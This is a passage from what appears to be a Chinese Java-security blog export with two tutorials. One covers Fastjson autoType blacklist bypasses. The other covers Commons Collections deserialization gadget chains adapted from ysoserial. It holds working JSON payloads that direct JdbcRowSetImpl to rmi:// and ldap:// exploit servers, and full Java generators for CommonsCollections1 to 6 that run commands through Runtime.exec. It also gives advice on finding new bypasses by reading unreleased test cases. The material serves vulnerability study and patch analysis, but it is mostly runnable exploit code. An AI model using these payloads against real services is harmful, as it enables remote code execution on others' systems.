for(mask = 0; mask < this.denyList.length; ++mask) {\n        accept = this.denyList[mask];\n        if (className.startsWith(accept)) {\n            throw new JSONException(\"autoType is not support. \" + typeName);\n        }\n    }\n\n    for(mask = 0; mask < this.acceptList.length; ++mask) {\n        accept = this.acceptList[mask];\n        if (className.startsWith(accept)) {\n            if (clazz == null) {\n                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);\n            }\n```\n\n该函数是先检查传入的@type的值是否是在黑名单里，然后再进入loadClass函数，这样的话如果loadClass函数里要是会对传入的class做一些处理的话，我们是不是就能绕过黑名单呢，跟进loadClass函数，\n\n```java\npublic static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {\n    if (className != null && className.length() != 0) {\n        Class<?> clazz = (Class)mappings.get(className);\n        if (clazz != null) {\n            return clazz;\n        } else if (className.charAt(0) == '[') {\n            Class<?> componentType = loadClass(className.substring(1), classLoader);\n            return Array.newInstance(componentType, 0).getClass();\n        } else if (className.startsWith(\"L\") && className.endsWith(\";\")) {\n            String newClassName = className.substring(1, className.length() - 1);\n            return loadClass(newClassName, classLoader);\n```\n\n可以看到当传入的className以L开头以 ; 结尾的时候会把className的首字符和最后一个字符截去，再去生成实例，于是绕过的poc就非常好写了，原来的payload的利用类的首尾加上这两个字符就Ok了\n\n```json\n{\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}\n```\n\n之后的42、43版本的绕过和41的原理是一样的我们就不再提了，具体可以去https://github.com/shengqi158/fastjson-remote-code-execute-poc/自行查阅。\n\n## 最新fastjson RCE的分析\n\nOK，现在来到了我们期待已久的最新的fastjson漏洞的分析，关于这个漏洞有很精彩的小故事可以讲一讲。\n\n这个漏洞在曝光之后poc迟迟未见，关于它能够被利用成功的版本也可谓是每日都有更新，关于版本有几个关键字 “51”、“48”，“58”，究竟是哪个让人摸不到头脑，于是乎，决定先去看看官方的公告，发现只有49版本releases的公告里面写了“增强安全防护”，于是乎决定去48、49版本寻觅一下，看看commit之类的，但是当时也没有发现什么。\n\n这个时候，一个名不愿透露姓名的大佬在某个技术群里面默默发了一个关键字“testcase“，当时忽然间产生了一丝电流，难道阿里的大佬们在修漏洞的时候会在testcase里面做测试，然后还把testcase的代码传到git里面了？但是还不够，因为testcase的代码太多了究竟放在哪里呢，这个时候之前的分析就可以知道，阿里在防护第一版RCE的时候是通过autotypecheck函数，那这次的补丁也很有可能和它相关喽，直接在testcase里面全局寻找带有autotype关键字的文件名，于是乎，就到达了如下位置\n\n![img](/images/a8/1.png)\n\n依次去看一下里面的文件，基本都是和反序列化漏洞相关的test，其中AutoTypeTest4.java文件中有如下代码：\n\n```java\n       String payload=\"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"}\";\n \t\n        String payload_2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:8889/xxx\\\",\\\"autoCommit\\\":true}\";\n \t\n        assertNotNull(\"class deser is not null\", config.getDeserializer(Class.class));\n        int size = mappings.size();\n        final int COUNT = 10;\n        for (int i = 0; i < COUNT; ++i){\n            JSON.parse(payload, config);\n        }\n\n        for (int i = 0; i < COUNT; ++i){ \t\n            Throwable error2 = null;\n            try {\n                JSON.parseObject(payload_2);\n            } catch (Exception e) {\n                error2 = e;\n            }\n            assertNotNull(error2); \t\n            assertEquals(JSONException.class, error2.getClass());\n        }\n        assertEquals(size, mappings.size());\n    }\n```\n\n看上去和以往的payload都不太一样，先去写一个简化版的代码，调试一下\n\n```java\nString payload=\"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"}\";\n\nString payload_2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/Exploit\\\",\\\"autoCommit\\\":true}\";\n\nJSON.parse(payload);\nJSON.parse(payload_2);\n```\n\n发现可以弹框成功（从49版本往前，一个版本一个版本试验，到47版本试验成功了），那这就很可疑了，但是还有个问题，漏洞要利用总不能让你同时穿进去两个json字符串让你依次parse吧，于是把两串json整理如下\n\n```json\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}}\n```\n\n果然可以利用成功，、接下来可以调试一下看看漏洞成因，因为一眼就能看出来是绕过了黑名单，所以问题的关键自然在checkAutoType()和loadClass()这两个函数中，去跟进一下\n\n首先在”a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”}传入的时候，Class类是不在黑名单内的，在MiscCodec类的deserialze函数里面可以看到会将val的值拿出来用来生成对应的对象，即JdbcRowSetImpl，但是我们并没法给JdbcRowSetImpl对象的成员变量赋值，\n\n![img](/images/a8/2.png)\n\n继续往deserialze的下面看，当传入的@type的值为Class的时候会调用loadClass函数，\n\n![img](/images/a8/3.png)\n\n再往下跟，有调了一下loadClass函数，多加了一个值为true的参数\n\n![img](/images/a8/4.png)\n\n再跟进去可以看到因为传入的cache为true，所以会在mapping里面把JdbcRowSetImpl这个对象的实例和com.sun.rowset.JdbcRowSetImpl对应起来，OK现在关于a的分析到此为止，\n\n![img](/images/a8/5.png)\n\n我们该去跟着b\n\n```json\n（”b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/Exploit”,”autoCommit”:true}}）\n```\n\n了，看看为什么checkautotype()函数没把b给拦下来，直接去跟进checkautotype函数，当autotype为true的时候，虽然发现黑名单匹配了，但是TypeUtils.getClassFromMapping(typeName) ！= null所以不会抛出异常。\n\n![img](/images/a8/6.png)\n\n而当autotype为false的时候，发现当传入的@type对应的类在mapping里面有的时候，就直接把之前生成的对象拉出来了，这时候直接返回，压根还没有走到后面的黑名单，所以成功绕过了之前的补丁。可以看到这次的poc是不受autotype影响的，\n\n![img](/images/a8/7.png)\n\n从上面的分析也可以明白后续官方的补丁做了什么，那自然是把cache的默认值改成了false，不让Class生成的对象存在mapping里面了。\n\n**备注：**\n\n最新的RCE漏洞https://xz.aliyun.com/t/5680这里讲的更清楚。原理：\n\n当发送第一次请求时，Class是通过deserializers.findClass加载的，然后Class将JdbcRowSetImpl类加载进map中，然后第二次请求时，就这里就成功找到了JdbcRowSetImpl类，从而绕过检测。\n\n# Fastjson漏洞挖掘的规律总结\n\n从上面追溯的fastjson的修复绕过上面可以看到有以下几点还是很值得注意的：\n\n1. fastjson的防范类是checkAutoType函数，而导致命令执行的很关键的一步是loadClass，因此从checkAutoType到loadClass之间的代码，将会是绕过需要研究的关键部分。\n2. 如果需要绕过黑名单，需要将目光放到使用量较大，并提供jndi功能的jar包上。\n3. 对于这种早就修复但是还没有公开的漏洞，github的源码中说不定有惊喜。\n\n\n\n**参考：**\n\nhttps://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA\n\nhttps://github.com/shengqi158/fastjson-remote-code-execute-poc/\n\nhttps://github.com/mbechler/marshalsec","tags":["反序列化","Fastjson"],"categories":["JAVA安全教程"]},{"title":"CommonsCollections反序列化gadget构造","url":"/2019/02/16/CommonsCollections反序列化gadget构造/","content":"\n# 前言\n\n文章 https://www.freebuf.com/articles/web/214096.html 已经把几种利用方式总结的很好了，没必要再重复造轮子，就转载过来。里面的代码大家最好自己idea里调试一遍，有助于理解。文章中最后的总结是构造payload的精华总结，希望大家能好好看下总结和理解。\n\n# Apache Commons Collections 简介\n\nApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。\n\nCommonsCollections造成RCE的根本原因就在于我们**构造了一个特殊的ChainedTransformer类的对象，这样当我们调用这个对象的transform函数的时候，就会造成命令执行**，于是，我们需要做的事情就是去寻找某个类，把包含恶意代码的transformerChain放到这个类里面，当对这个类的对象进行反序列化的时候会调用transformerChain的transform函数\n\n下面的payload构造都是参考自[ysoserial](https://github.com/frohoff/ysoserial)。这个工具用来生成各种反序列攻击向量，本文介绍的是常用的CommonmonsCollections库的构造方法，除此之外，还有很多反序列化的构造方法，大家可以去看源码好好研究下。\n\n#CommonsCollections1\n\n**适用版本**：3.1-3.2.1，jdk1.8以前\n\n这边先上CommonsCollections1的代码，为了便于阅读，这些代码都是我从ysoserial里面抽离并简化了的，关键的部分已经给上了注释，\n\n```java\nimport java.io.*;\nimport java.lang.reflect.*;\nimport java.util.HashMap;\nimport java.util.Map;\nimport com.nqzero.permit.Permit;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport static sun.reflect.misc.FieldUtil.getField;\npublic class CommonsCollectionPayload {\n    static String ANN_INV_HANDLER_CLASS = \"sun.reflect.annotation.AnnotationInvocationHandler\";\n    //getInvocationHandler用于获取名为handler的InvocationHandler实例，并将map传入成员变量memberValues\n    public static InvocationHandler getInvocationHandler(String handler, Map<String, Object> map) throws Exception {\n        //获取构造函数\n        final Constructor<?> ctor = Class.forName(handler).getDeclaredConstructors()[0];\n        //获取handler的私有成员的访问权限，否则会报 can not access a member of class sun.reflect.annotation.AnnotationInvocationHandler\n        Permit.setAccessible(ctor);\n        //实例化\n        return (InvocationHandler) ctor.newInstance(Override.class, map);\n    }\n    //createMyproxy用于返回handler为ih，代理接口为iface的动态代理对象\n    public static <T> T createMyproxy(InvocationHandler ih, Class<T> iface) {\n        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 1);\n        allIfaces[0] = iface;\n        return iface.cast(Proxy.newProxyInstance(CommonsCollectionPayload.class.getClassLoader(), allIfaces, ih));\n    }\n    //setFieldValue用于设置obj对象的成员变量fieldName的值为value\n    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        Field field = null;\n        try {\n            //获取私有成员变量\n            field = obj.getClass().getDeclaredField(fieldName);\n            //获取私有成员变量访问权限\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        field.set(obj, value);\n    }\n    public static void main(String[] args) throws Exception {\n        String[] execArgs = new String[]{\"open /Applications/Calculator.app/\"};\n        // inert chain for setup\n        Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{new ConstantTransformer(1)});\n        // real chain for after setup\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{\n                        String.class, Class[].class}, new Object[]{\n                        \"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\", new Class[]{\n                        Object.class, Object[].class}, new Object[]{\n                        null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class}, execArgs),\n                new ConstantTransformer(1)};\n        //下面这部分为RCE的关键部分代码\n        Map innerMap = new HashMap();\n        //生成一个lazyMap对象，并将transformerChain赋值给对象的factory成员变量\n        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        //创建一个Map接口的代理，并且为这个代理设置一个memberValues为lazyMap的AnnotationInvocationHandler\n        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);\n        //创建一个memberValues为mapProxy的AnnotationInvocationHandler对象，这个对象也就是我们反序列化利用的恶意对象\n        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);\n        //通过反射的方式进行赋值，即使赋值在生成对象之后也没有关系\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        //将恶意对象存储为字节码\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(handler);\n        oos.flush();\n        oos.close();\n        //读取恶意对象字节码并进行反序列化操作\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object evilObject = ois.readObject();\n        ois.close();\n    }\n}\n```\n\n看一下关键部分的调用栈，\n\n![img1.png](/images/a7/1.png)\n\n当对恶意对象AnnotationInvocationHandler进行反序列化的时候，调用readObject方法，并对成员变量memberValues调用entrySet方法，\n\n![img2.png](/images/a7/2.png)\n\n由于memberValues是一个代理对象，所以回去调用该对象对应handler的invoke方法，一定要注意，这个时候的handler就是memberValues为lazyMap的handler了\n\n![img3.png](/images/a7/3.png)\n\n由于entrySet匹配不到if语句中的判断，走到else，，从而调用this.memberValues.get(var4)，于是到达了lazyMap.get()了\n\n![img4.png](/images/a7/4.png)\n\n我们代码注释里已经说过了，lazyMap的factory变量就是我们的恶意对象transformerChain，并且调用了他的transform方法，成功造成命令执行。\n\n我们去看一下3.2.2版本的时候这个漏洞是如何修复的\n\n```\n    private void writeObject(ObjectOutputStream os) throws IOException {\n        FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(\"org.apache.commons.collections.functors.InvokerTransformer\")) : class$org$apache$commons$collections$functors$InvokerTransformer);\n        os.defaultWriteObject();\n    }\n    private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {\n        FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(\"org.apache.commons.collections.functors.InvokerTransformer\")) : class$org$apache$commons$collections$functors$InvokerTransformer);\n        is.defaultReadObject();\n    }\n```\n\n就是在调用readObject和writeObject的时候把InvokerTransformer类给拉黑了。（当然这个还是需要看一下系统的配置org.apache.commons.collections.enableUnsafeSerialization的值的，不过这个值默认是false）\n\n# CommonsCollections2\n\n**适用版本**：commons-collections-4.0, jdk7u21及以前其实这个CommonsCollections2只能叫另一种利用方式，而不能叫做CommonsCollections1的绕过，因为CommonsCollections1也是可以在commons-collections-4.0利用成功的，但是因为commons-collections-4.0删除了lazyMap的decode方法，所以需要将代码中的\n\n```java\nMap lazyMap = LazyMap.decorate(innerMap, transformerChain);\n```\n\n修改为\n\n```java\nMap lazyMap = LazyMap.lazyMap(innerMap,transformerChain);\n```\n\n而且，更重要的一点，CommonsCollections2不能在3.1-3.2.1版本利用成功，**根本原因在于CommonsCollections2的payload中使用的TransformingComparator在3.1-3.2.1版本中还没有实现Serializable接口，无法被反序列化。**\n\n现在我们来看一下CommonsCollections2的payload\n\n```java\nimport com.nqzero.permit.Permit;\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\nimport static sun.reflect.misc.FieldUtil.getField;\npublic class CommonCollection2Payload {\n//    通过javassist动态创建类的时候需要用到这个类\n    public static class StubTransletPayload extends AbstractTranslet implements Serializable {\n        private static final long serialVersionUID = -5971610431559700674L;\n        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}\n        @Override\n        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}\n    }\n// 设置成员变量值\n    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        Field field = null;\n        try {\n            //获取私有成员变量\n            field = obj.getClass().getDeclaredField(fieldName);\n            //获取私有成员变量访问权限\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        field.set(obj, value);\n    }\n//  获取成员变量值得\n    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        Field field = null;\n        try {\n            field = obj.getClass().getDeclaredField(fieldName);\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        return field.get(obj);\n    }\n//  7u21反序列化漏洞恶意类生成函数\n    public static Object createTemplatesImpl(String command) throws Exception{\n        Object templates = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").newInstance();\n        // use template gadget class\n        ClassPool pool = ClassPool.getDefault();\n        final CtClass clazz = pool.get(StubTransletPayload.class.getName());\n        String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" +\n                command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") +\n                \"\\\");\";\n        clazz.makeClassInitializer().insertAfter(cmd);\n        clazz.setName(\"ysoserial.Pwner\" + System.nanoTime());\n        final byte[] classBytes = clazz.toBytecode();\n        setFieldValue(templates, \"_bytecodes\", new byte[][] {\n                classBytes});\n        // required to make TemplatesImpl happy\n        setFieldValue(templates, \"_name\", \"Pwnr\");\n        setFieldValue(templates, \"_tfactory\", Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\").newInstance());\n        return templates;\n    }\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final Object templates = createTemplatesImpl(command);\n        // payload中再次使用了InvokerTransformer，可见这个在3.2.2版本中被拉黑的类在4.0中反倒又可以用了\n        //这个toString值只是个幌子，后面会通过setFieldValue把iMethodName的值改成newTransformer\n        final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]);\n        // payload中的核心代码模块，创建一个PriorityQueue对象，并将它的comparator设为包含恶意transformer对象的TransformingComparator\n        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));\n        // 先设置为正常变量值，在后面通过setFieldValue来修改\n        queue.add(1);\n        queue.add(1);\n        // 不再像第一个payload中一样直接去调用调出runtime的exec，而是通过调用TemplatesImpl类的newTransformer方法来实现RCE\n        setFieldValue(transformer, \"iMethodName\", \"newTransformer\");\n        final Object[] queueArray = (Object[]) getFieldValue(queue, \"queue\");\n        queueArray[0] = templates;\n        queueArray[1] = 1;\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(queue);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n}\n```\n\n这个payload和1在造成RCE的原理上有个不同是不再去依靠Runtime类的exec，而是使用了我们知名的7u21模块，关于7u21模块RCE的讲解，我们也不细谈，网上大把大把的分析，只需要明白一件事情，我们只要能调用包含恶意字节码的TemplatesImpl对象的利用链中的任意函数(getOutputProperties、newTransformer等等)，就能造成RCE。\n\n先去看调用链，\n\n![img5.jpg](/images/a7/5.png)\n\n反序列化时候调用PriorityQueue的readObject方法，并在函数最后调用heapify方法，\n\n![img6.jpg](/images/a7/6.png)\n\nheapify方法会把PriorityQueue的queue变量作为参数去调用siftDown方法\n\n![img7.jpg](/images/a7/7.png)\n\n只要有comparetor就会去调用siftDownUsingComparator方法\n\n![img8.jpg](/images/a7/8.png)\n\n调用comparator的compare方法，这个comparator就是我们传入的tranformer为恶意InvokerTransformer对象的TransformingComparator\n\n![img9.jpg](/images/a7/9.png)\n\n成功调用到恶意tranformer的tranform方法，并把恶意TemplatesImpl作为参数传入，剩下的不在去跟。\n\n![img10.jpg](/images/a7/10.png)\n\n关于4.0的补丁，和3.2.2的时候一模一样，就是把InvokerTransformer给拉黑了。\n\n# CommonsCollections3\n\n**适用版本**：3.1-3.2.1，jdk7u21及以前\n\nCommonsCollections3出现了一个我们在CommonsCollections1中没怎么见到过的InstantiateTransformer，先去看一下这个InstantiateTransformer的transform方法，\n\n```java\n    public Object transform(Object input) {\n        try {\n            if (!(input instanceof Class)) {\n                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));\n            } else {\n                Constructor con = ((Class)input).getConstructor(this.iParamTypes);\n                return con.newInstance(this.iArgs);\n            }\n        }\n```\n\n简单来说这个transform方法的用处就是**调用input参数的构造函数，并且这个类的两个成员变量就是传给构造函数的参数类型和参数值**。其他的地方就和CommonsCollections1差不多了。\n\n看一下代码，考虑到代码中用到的一些关键函数在前面两个payload里面已经给出了，所以接下来的代码里面我就只给出main函数代码了。\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        Object templatesImpl = createTemplatesImpl(command);\n        final Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{ new ConstantTransformer(1) });\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(\n                        new Class[] { Templates.class },\n                        new Object[] { templatesImpl } )};\n        final Map innerMap = new HashMap();\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);\n        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);\n        //这样的话，调用transformerChain的tranform方法就相当于调用TrAXFilter(templatesImpl)\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(handler);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n看一下调用栈，\n\n![img11.jpg](/images/a7/11.png)\n\n基本所有地方都和CommonsCollections1差不多，唯一的区别就在于循环调用的transformers变成了这个样子\n\n```java\n final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(\n                        new Class[] { Templates.class },\n                        new Object[] { templatesImpl } )};\n```\n\nConstantTransformer返回了TrAXFilter的对象给到InstantiateTransformer的tranform方法，最终调用TrAXFilter的构造函数，并把恶意的templatesImpl作为参数给到构造函数，\n\n![img12.jpg](/images/a7/12.png)\n\n看一下TrAXFilter的构造函数会去调用传入的恶意templatesImpl的newTransformer方法，正好符合我们的期望，造成RCE。\n\n看一下3.2.2版本的修复补丁，和CommonsCollections1一样，就是把InstantiateTransformer类给拉黑了。\n\n# CommonsCollections4\n\n**适用版本**：4.0，jdk7u21及以前\n\nCommonsCollections4这个payload认真的说，完全没有任何新的东西，其实就是把CommonsCollections2和CommonsCollections3做了一个杂交。不过从中我们可以窥探到，其实不论是4.0版本还是3.1-3.2.1版本，利用的方法基本都是可以共通的。\n\n看一下代码，\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        Object templates = createTemplatesImpl(command);\n        ConstantTransformer constant = new ConstantTransformer(String.class);\n        Class[] paramTypes = new Class[] { String.class };\n        Object[] str = new Object[] { \"foo\" };\n        InstantiateTransformer instantiate = new InstantiateTransformer(\n                paramTypes, str);\n        paramTypes = (Class[]) getFieldValue(instantiate, \"iParamTypes\");\n        str = (Object[]) getFieldValue(instantiate, \"iArgs\");\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });\n        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));\n        queue.add(1);\n        queue.add(1);\n        setFieldValue(constant, \"iConstant\", TrAXFilter.class);\n        paramTypes[0] = Templates.class;\n        str[0] = templates;\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(queue);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n看一下调用栈，\n\n![img13.jpg](/images/a7/13.png)\n\n代码在上面都是分析过的，简要的文字分析一下：反序列化的时候调用PriorityQueue的readObject方法，从而调用了TransformingComparator中恶意的ChainedTransformer对象的tranform方法，通过循环调用ChainedTransformer中iTransformer对象的tranform方法，进而调用TrAXFilter的构造方法，从而造成命令执行。\n\n不过关于4.1版本的修复和3.2.2是存在不一样的地方的，3.2.2对于InstantiateTransformer类的处理是拉入黑名单，而4.1版本选择把InstantiateTransformer类的反序列化接口给删除了。\n\n![img14.jpg](/images/a7/14.png)\n\n# CommonsCollections5\n\n**适用版本**：3.1-3.2.1，jdk1.8（1.9没试）\n\nCommonsCollections5和前面几个payload有些不太一样的地方，因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以BadAttributeValueExpException就被发掘了除了，我们直接根据代码来了解这个类，\n\n```java\npublic static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[] { command };\n        final Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{ new ConstantTransformer(1) });\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, execArgs),\n                new ConstantTransformer(1) };\n        final Map innerMap = new HashMap();\n        //创建factory为恶意ChainedTransformer对象的lazyMap类实例\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        //创建map为恶意lazyMap，key为foo的TiedMapEntry类实例\n        TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n        //将BadAttributeValueExpException对象的成员变量val赋值为恶意entry\n        BadAttributeValueExpException val = new BadAttributeValueExpException(null);\n        Field valfield = val.getClass().getDeclaredField(\"val\");\n        Permit.setAccessible(valfield);\n        valfield.set(val, entry);\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(val);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n这个利用链很简单，\n\n![img15.jpg](/images/a7/15.png)\n\n在BadAttributeValueExpException的readObject中，会调用它的成员变量val（也就是我们传入的恶意TiedMapEntry对象）的toString方法，\n\n![img16.jpg](/images/a7/16.png)\n\n在TiedMapEntry中会调用自身的getKey和getValue方法，\n\n![img17.jpg](/images/a7/17.png)\n\n在getValue方法中会调用成员变量map（也就是我们传入的恶意LazyMap对象）的get方法，\n\n![img18.jpg](/images/a7/18.png)\n\n接下来就和CommonsCollections1是一样的了，不再分析。\n\nCommonsCollections在3.2.2版本的时候同样将BadAttributeValueExpException拉入了黑名单。\n\n# CommonsCollections6\n\n**适用版本**：3.1-3.2.1，jdk1.7,1.8均可成功\n\nCommonsCollections6是一个实用性比较广的payload，和上面五个payload相比，它的利用受jdk版本的影响是最小的，先看代码，\n\n```java\n public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[] { command };\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, execArgs),\n                new ConstantTransformer(1) };\n        Transformer transformerChain = new ChainedTransformer(transformers);\n        final Map innerMap = new HashMap();\n//创建一个factory为恶意ChainedTransformer对象的lazyMap类实例\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n//创建一个map为恶意lazyMap类实例，key为foo的TiedMapEntry类实例\n        TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n        HashSet map = new HashSet(1);\n        map.add(\"foo\");\n        Field f = null;\n        try {\n            f = HashSet.class.getDeclaredField(\"map\");\n        } catch (NoSuchFieldException e) {\n            f = HashSet.class.getDeclaredField(\"backingMap\");\n        }\n//取出HashSet对象的成员变量map\n        Permit.setAccessible(f);\n        HashMap innimpl = (HashMap) f.get(map);\n        Field f2 = null;\n        try {\n            f2 = HashMap.class.getDeclaredField(\"table\");\n        } catch (NoSuchFieldException e) {\n            f2 = HashMap.class.getDeclaredField(\"elementData\");\n        }\n//取出HashMap对象的成员变量table\n        Permit.setAccessible(f2);\n        Object[] array = 